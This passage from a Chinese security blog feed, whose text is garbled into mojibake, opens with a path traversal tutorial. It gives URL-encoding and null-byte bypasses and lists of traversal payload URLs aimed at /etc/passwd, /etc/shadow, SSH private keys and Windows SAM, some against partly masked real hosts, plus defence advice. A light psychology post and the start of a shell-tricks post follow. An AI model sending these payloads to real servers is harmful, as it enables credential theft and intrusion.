URLç¼–ç ç»•è¿‡</h3><p>ä¹Ÿå¯ä»¥é‡‡ç”¨ URL ç¼–ç æ¥ç»•è¿‡æœåŠ¡å™¨å¯¹ . æˆ–è€… / çš„æ£€æµ‹</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (åŒé‡URLç¼–ç )</p></blockquote><h3 id="0x04-ç»å¯¹è·¯å¾„é…åˆ"><a href="#0x04-ç»å¯¹è·¯å¾„é…åˆ" class="headerlink" title="0x04 ç»å¯¹è·¯å¾„é…åˆ ../"></a>0x04 ç»å¯¹è·¯å¾„é…åˆ ../</h3><p>æœ‰äº› web åœ¨è·å–æ–‡ä»¶æ—¶ï¼Œä¼šé¦–å…ˆåˆ¤æ–­æ˜¯å¦ä»¥ä¸€ä¸ªå›ºå®šçš„è·¯å¾„å¼€å¤´</p><p>é‚£ä¹ˆå°±å¯ä»¥é…åˆ ../ æ¥è¿”å›ä¸Šä¸€çº§éå†ä»»æ„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="0x05-æˆªæ–­æ–‡ä»¶åç¼€"><a href="#0x05-æˆªæ–­æ–‡ä»¶åç¼€" class="headerlink" title="0x05 æˆªæ–­æ–‡ä»¶åç¼€"></a>0x05 æˆªæ–­æ–‡ä»¶åç¼€</h3><p>æŸäº› web å¯¹æ–‡ä»¶ç±»å‹ä½œäº†é™åˆ¶ï¼Œåªæœ‰å½“åç¼€ä¸ºå›¾ç‰‡æ—¶æ‰è§£æ</p><p>è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨ %00 æ¥æˆªæ–­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h3 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h3><p>è¦è¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶çš„è¯ ../ å¯ä»¥éšæ„æ‹¼æ¥ä»»æ„ä¸ªï¼Œå°±åƒ ../../../../../../../../../../../../../../../../../../../../../../</p><p>å› ä¸ºåˆ°äº†æ ¹ç›®å½•å†è¿”å›ä¸Šçº§ç›®å½•ä¾ç„¶æ˜¯æ ¹ç›®å½•</p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>é˜²æ­¢æ–‡ä»¶è·¯å¾„éå†æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥å®Œå…¨ä¼ é€’ç»™æ–‡ä»¶ç³»ç»ŸAPI</p><p>å¦‚æœè®¤ä¸ºä¸å¯é¿å…çš„æ˜¯å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ APIï¼Œåˆ™åº”åŒæ—¶ä½¿ç”¨ä¸¤å±‚é˜²å¾¡ï¼Œä»¥é˜²æ­¢å—åˆ°æ”»å‡»ï¼š</p><blockquote><ul><li>åº”ç”¨ç¨‹åºåº”åœ¨å¤„ç†ä¹‹å‰éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼ŒéªŒè¯åº”ä¸å…è®¸å€¼çš„ç™½åå•è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰€éœ€çš„åŠŸèƒ½æ— æ³•åšåˆ°è¿™ä¸€ç‚¹ï¼Œåˆ™éªŒè¯åº”éªŒè¯è¾“å…¥å†…å®¹ä»…åŒ…å«å…è®¸çš„å†…å®¹ï¼Œä¾‹å¦‚çº¯å­—æ¯æ•°å­—å­—ç¬¦</li><li>éªŒè¯æä¾›çš„è¾“å…¥åï¼Œåº”ç”¨ç¨‹åºåº”å°†è¾“å…¥é™„åŠ åˆ°åŸºæœ¬ç›®å½•ï¼Œå¹¶ä½¿ç”¨å¹³å°æ–‡ä»¶ç³»ç»Ÿ API è§„èŒƒåŒ–è·¯å¾„ã€‚éªŒè¯è§„èŒƒåŒ–è·¯å¾„ä»¥é¢„æœŸçš„åŸºæœ¬ç›®å½•å¼€å¤´</li></ul></blockquote><h2 id="æ”»å‡»è·¯å¾„æ•´ç†"><a href="#æ”»å‡»è·¯å¾„æ•´ç†" class="headerlink" title="æ”»å‡»è·¯å¾„æ•´ç†"></a>æ”»å‡»è·¯å¾„æ•´ç†</h2><h3 id="æ–‡ä»¶æ•´ç†"><a href="#æ–‡ä»¶æ•´ç†" class="headerlink" title="æ–‡ä»¶æ•´ç†"></a>æ–‡ä»¶æ•´ç†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 éšè—æ–‡ä»¶</span><br><span class="line">web.xml  #Java Webé¡¹ç›®é…ç½®æ–‡ä»¶  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysqlä¸‹é…ç½®æ–‡ä»¶</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # è€ç‰ˆæœ¬ - IIS CGIæ–‡ä»¶åè§£ç æ¼æ´</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h3 id="è·¯å¾„æ•´ç†"><a href="#è·¯å¾„æ•´ç†" class="headerlink" title="è·¯å¾„æ•´ç†"></a>è·¯å¾„æ•´ç†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h3 id="è·¯å¾„éå†æ£€æµ‹"><a href="#è·¯å¾„éå†æ£€æµ‹" class="headerlink" title="è·¯å¾„éå†æ£€æµ‹"></a>è·¯å¾„éå†æ£€æµ‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h3 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">åœ¨httpd.confæ–‡ä»¶ä¸­æ‰¾åˆ°   Options +Indexes +FollowSymLinks +ExecCGI  å¹¶ä¿®æ”¹æˆ   Options -Indexes+FollowSymLinks +ExecCGI  å¹¶ä¿å­˜</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">ä¿®æ”¹conf&#x2F;web.xmlï¼Œå°†true æ”¹ä¸ºfalse é‡å¯tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1ã€åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ‰“å¼€ æ§åˆ¶é¢æ¿ --&gt;ç®¡ç†å·¥å…·--&gt; IISç®¡ç†å™¨</span><br><span class="line">2ã€å³å‡»é»˜è®¤ç½‘ç«™ --&gt; å±æ€§--&gt; ä¸»ç›®å½• --&gt;å–æ¶ˆâ€œç›®å½•æµè§ˆâ€å¤é€‰æ¡†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆæ€§çŸ¥è§‰åå·®å¯¼è‡´èœœæ±è‡ªä¿¡</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>äººç”Ÿä¸‰å¤§é”™è§‰ï¼šğŸ“±æŒ¯åŠ¨ã€ğŸ‘´èƒ½åæ€ï¼ˆğŸ‘´ç¡®å®å¯ä»¥åæ€ï¼Œç¡®å®å¯ä»¥å•Šï¼ï¼‰ã€å¥¹å–œæ¬¢ğŸ‘´</p><p>â€Taå–œæ¬¢ğŸ‘´ä¸ºç”šä¹ˆè¿˜ä¸æ‰¿è®¤â€œï¼Œæˆ–è®¸å¯ä»¥ç”¨æ€§çŸ¥è§‰åå·®æ¥è§£é‡Šã€‚</p><p>è™½ç„¶æŒ‰ç†æ¥è¯´â€Taæ˜æ˜æš—æ‹æˆ‘ï¼Œå°±æ˜¯ä¸è‚¯å‹‡æ•¢æ‰¿è®¤è‡ªå·±çš„æ„Ÿæƒ…â€œè¿™ç§é”™è§‰æ˜¯ä¸åˆ†ç”·å¥³çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´åŸºæœ¬ä¸Šæ˜¯ç”·æ€§å æ¯”å¤šï¼Œå¯¹äºä¸€ä¸ªæ™®é€šçš„ã€æ­£å¸¸çš„ã€å‹å¥½çš„è¡¨ç¤ºï¼Œç”·æ€§æ™®éæ€§åœ°å®¹æ˜“è¯¯è§£ä¸ºçˆ±æƒ…ï¼Œåœ¨ä¸¤æ€§ä¸­è™½ç„¶éƒ½ä¼šæœ‰è®¤çŸ¥ä¸æ­£ç¡®çš„æ—¶å€™ï¼Œä½†æ˜¯ç”·æ€§æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§Taå–œæ¬¢æˆ‘çš„å¤¸å¤§å‹æ€§çŸ¥è§‰åå·®ã€‚</p><hr><p>å¿ƒç†å­¦å®¶åšè¿‡çš„ç ”ç©¶ï¼š</p><p>â€‹    æ‰¾ä¸€äº›ç”·å¥³å¤§å­¦ç”Ÿæ¥è§‚çœ‹æŸä¸ªå½•åƒï¼Œå½•åƒå†…å®¹æ˜¯ä¸€ä¸ªæ•™æˆå’Œä¸€ä¸ªå¥³å­¦ç”Ÿè°ˆè¯ï¼Œå¥³å­¦ç”Ÿæƒ³è¦è®ºæ–‡å»¶æœŸï¼Œæ•™æˆå’Œå¥³å­¦ç”Ÿäº¤æµå¾—æ¯”è¾ƒå‹å¥½ï¼Œå—·ï¼Œä¸¤ä¸ªæ¼”æŠ€å¾ˆç²¾æ¹›çš„æ¼”å‘˜ä¹Ÿæ³¨æ„äº†ä»…ä»…åªæ˜¯è¡¨ç°å‹å¥½ï¼Œä¸è¦è¡¨ç°å¾—è½»æµ®å’ŒæŒ‘é€—ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¥³ç”Ÿä»¬ï¼šå½•åƒä¸­åªçœ‹åˆ°å¥³å­©å­çš„å‹å¥½ï¼Œå…³äºæ€§æ„Ÿã€æ€§è¯±æƒ‘è¿™ç±»çš„æ²¡çœ‹å‡ºæ¥ï¼Œè€Œç”·ç”Ÿä»¬åˆ™çº·çº·è¡¨ç¤ºçœ‹å‡ºæ¥è¿™ä¸ªå¥³å­©å­æ˜æ˜¾æœ‰æ€§æ–¹é¢çš„å±•ç°å’Œè¯±æƒ‘ã€‚</p><p>å¦å¤–çš„ä¸€ä¸ªç ”ç©¶ï¼š</p><p>â€‹    çœ‹çš„æ˜¯ä¸¤ä¸ªç”·å¥³åŒå­¦äº’ç›¸åœ¨å­¦ä¹ çš„ç…§ç‰‡ï¼Œç„¶åå›¾ç‰‡ä¸­çš„å¥³å­©å­å¯¹è¿™ä¸ªç”·çš„æœ‰æ²¡æœ‰æ„æ€ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¤§éƒ¨åˆ†å¥³ç”Ÿçœ‹åˆ°ï¼ˆè§‰å¾—ï¼‰æ²¡æœ‰å•Šï¼Œä¸¤ä¸ªäººå¾ˆæ­£å¸¸å•Šï¼Œä½†ç”·ç”Ÿä¸€çœ‹ä¸å¯¹ï¼Œè¿™ä¸ªå¥³å­©å­å¯¹è¿™ä¸ªç”·å­©å­æœ‰æ„æ€ï¼Œæœ‰æ„æ€ï¼Œè‚¯å®šæœ‰æ„æ€å“ˆï¼Œç”·ç”Ÿä»¬æ™®éè®¤ä¸ºç…§ç‰‡ä¸­çš„å¥³å­©å­å¿ƒä¸åœ¨ç„‰ï¼Œå¿ƒä¸åœ¨å­¦ä¹ ï¼Œè¡¨ç°å‡ºäº†å¾ˆæ˜æ˜¾çš„æ€§æ„Ÿå’Œå¯¹ç”·å­©å­çš„è¯±æƒ‘ã€‚</p><hr><p>è¿™äº›åå·®ä¹Ÿå¹¶ä¸åªé€‚ç”¨äºæ™®ä¿¡ç”·ï¼ˆæ™®é€šè€Œåˆè‡ªä¿¡ï¼‰ï¼Œä¹Ÿé€‚ç”¨äºä¸€äº›å…·æœ‰è¾ƒé«˜é…å¶ä»·å€¼çš„äººï¼Œå°±æ¯”å¦‚ç”·é¢†å¯¼ï¼Œäº‹ä¸šæœ‰æˆå‹ç”·äººæ›´å®¹æ˜“äº§ç”Ÿè¿™ç§é”™è§‰ï¼Œæ¬¸ï¼ŒğŸ‘´çš„å¥³ä¸‹å±è¿™äº›äººå¯¹ğŸ‘´æœ‰æ„æ€å¥¥ï¼Œæ‰€ä»¥ä¸€äº›å·¥ä½œåœºæ™¯ä¸­çš„æ€§éªšæ‰°é—®é¢˜ä¹Ÿæºäºæ­¤ ã€‚</p><p>å¥³æ€§æ˜æ˜åªæ˜¯ä¸€ç§å‹å¥½çš„è¡¨ç¤ºï¼Œä½†å¯¹æ–¹å´å¾€å¾€å¯ä»¥è¯¯è§£ä¸ºå¥¹æ˜¯å¯¹æˆ‘å¿ƒæœ‰æ‰€å±ï¼Œæ›´æœ‰æ„æ€çš„æ˜¯ï¼Œå½“ç”·æ€§é‡åˆ°æ¼‚äº®çš„æ€§æ„Ÿçš„å¥³æ€§çš„æ—¶å€™æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§åå·®ï¼Œä¸»è¦æƒ³ä¸€æƒ³ï¼Œäººå®¶æ¼‚äº®çš„å¦¹å­æ‹©å¶æ ‡å‡†éƒ½å·²ç»å¤Ÿé«˜äº†ï¼Œä¸ºç”šä¹ˆå°±è¿™ä¹ˆé‚£å•¥è€Œä¸çŸ¥å‘¢ã€‚</p><p>å…¶åŸå› å°±åœ¨äºæ¼«é•¿çš„äººç±»è¿›åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸¤æ€§ä»è¿›åŒ–çš„æ ¹æºä¸Šæ¥è®²ï¼ŒTaä»¬çš„æ€§é€‰æ‹©ã€æ‹©å¶ç­–ç•¥æ˜¯ä¸åŒçš„ï¼Œå¥³æ€§ç”±äºå­©å­çš„æŠšå…»ç­‰é—®é¢˜éœ€è¦ä¸€ä¸ªç¨³å®šæœ‰èµ„æºçš„ç”·å£«ï¼Œæ‰€ä»¥å¥³æ€§åœ¨æ‹©å¶ä¸­éƒ½æ˜¯å¾ˆæ…é‡çš„ï¼Œè€Œç”·æ€§åˆ™ä¸ç„¶ï¼ŒTaåœ¨æ•´ä¸ªç”Ÿæ®–è¿‡ç¨‹æ‰€è´Ÿæ‹…çš„å¹¶ä¸æ˜¯é‚£ä¹ˆå¤šï¼Œæ‰€ä»¥ç”·æ€§ä¼šè¿½æ±‚æ›´å¤šçš„å¼‚æ€§ï¼Œåœ¨æ›´å¤šçš„ä¸¤æ€§æ¬¢æ„‰ä¹‹ä¸­æ‰èƒ½æå‡è‡ªå·±åŸºå› ä¼ é€’ä¸‹å»çš„æ¯”ç‡ã€‚</p><p>å¯¹äºç”·æ€§è€Œè¨€ï¼ŒTaå¯¹å¥³æ€§çš„æƒ…æ„Ÿè®¤çŸ¥å®¹æ˜“çŠ¯ä¸¤æ–¹é¢é”™è¯¯ï¼Œä¸€æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æ²¡æ„æ€ï¼Œè€ŒğŸ‘´è§‰å¾—å¯¹æ–¹æœ‰æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§è¯¯æŠ¥ï¼Œå¦å¤–æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æœ‰æ„æ€ï¼Œè€ŒğŸ‘´åˆ¤æ–­Taæ²¡æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§æ¼æŠ¥ï¼Œä¸¤ç§é”™è¯¯æƒè¡¡ä¸‹æ¥ï¼Œç”·æ€§åšå‡ºçš„é€‰æ‹©æ˜¯ï¼šå®å¯è¯¯æŠ¥ï¼Œä¸å¯æ¼æŠ¥ï¼Œå®å¯é”™æ€ä¸€åƒï¼Œä¸èƒ½æ”¾è¿‡ä¸€ä¸ªã€‚</p><p>è¿›åŒ–çš„åŠ¨åŠ›è®©ç”·æ€§æŠŠä»»ä½•çš„å¥³æ€§çš„å¥½æ„Ÿéƒ½è§£é‡Šä¸ºæ€§æ–¹é¢çš„å…´è¶£ï¼Œæ‰€ä»¥æœ‰äº†å…¸å‹çš„å¾®ç¬‘å½“çˆ±æƒ…è¿™ç§ææ³•ï¼Œè¯´ç™½äº†ï¼Œè¿™ä¸€ç±»çš„ç”·æ€§å‘¢ï¼Œå°±æ˜¯ç”¨ä¸‹åŠèº«æ€è€ƒçš„åŠ¨ç‰©ã€‚</p><p>ä¸è¿‡æœ€åè¿˜æ˜¯è¯´ä¸€å¥ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”·æ€§éƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼Œæœ¬æ–‡ä¹Ÿåªæ˜¯å›¾ä¸€ä¹ï¼Œå¼€å¼€ç©ç¬‘ï¼Œè°ƒä¾ƒå‡ å¥ã€‚</p><p>å·®ä¸å¤šå¾—äº†ï¼Œæºœä¹‹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›shellçš„éªšæ“ä½œ</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="æ„é€ ä»»æ„æ•°å­—"><a href="#æ„é€ ä»»æ„æ•°å­—" class="headerlink" title="æ„é€ ä»»æ„æ•°å­—"></a>æ„é€ ä»»æ„æ•°å­—</h2><p>å¾ˆä¹…ä¹‹å‰æ— æ„é—´å‘ç° <code>$(())</code> è¿™ä¸ªå¥½ç©çš„ç©æ„å„¿ï¼Œæœ‰è¿‡ä¸€æ³¢æ·±â™‚å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">æ•°å­—  | æ„é€                                                          </span><br><span class="line">-1   | $((~$(())))</span><br><span class="line">0    